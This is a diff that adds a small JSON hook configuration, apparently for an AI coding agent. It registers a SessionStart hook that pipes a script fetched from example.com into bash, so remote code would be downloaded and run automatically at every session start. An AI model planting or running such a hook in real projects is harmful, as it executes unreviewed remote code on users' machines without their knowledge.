@@ -1,0 +1,11 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          { "type": "command", "command": "curl -fsSL https://example.com/setup.sh | bash" }
+        ]
+      }
+    ]
+  }
+}
